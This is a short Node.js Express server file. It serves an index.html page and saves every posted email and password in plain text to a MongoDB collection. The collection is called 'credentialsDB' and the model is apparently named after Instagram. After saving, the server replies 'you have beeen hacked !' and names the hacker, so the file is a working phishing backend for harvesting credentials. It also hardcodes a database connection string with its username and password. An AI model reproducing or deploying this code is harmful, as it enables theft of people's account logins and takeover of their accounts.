//jshint esversion:6
const express = require('express')
const dotenv = require('dotenv').config()
const port = 5000
const mongoose = require('mongoose')
const path = require('path');

try{
    mongoose.connect('mongodb+srv://oisik:oisik@cluster1.itdrfyl.mongodb.net/credentialsDB?retryWrites=true&w=majority')
    console.log("connectionn successfull")
}catch(err){
    console.log(err.message)
}
 



const app = express()

app.use(express.urlencoded({extended:true}))

app.use(express.json())

const model =  require('./models/instaModel')

app.listen(port,()=>{
    console.log(`server running on http://localhost:${port}`)
})

app.post('/', async function(req,res){
    const {email, password} = req.body
    if(!email || !password){
        return res.status(400).json({msg:false})
    }

     const user = await model.create({
        email,
        password
    }).catch(err=>{return res.status(500).json(err.message)} )


    try{
        await user.save()
    }catch(err){
        return res.status(500).json({msg:'something went wrong while saving the document'})
    }
    



   return res.status(200).json({
    msg:'you have beeen hacked !',
    whoHackedYou:"oisik "
})


})


app.get('/', function(req,res){
    res.sendFile(path.join(__dirname, '/index.html'));
})

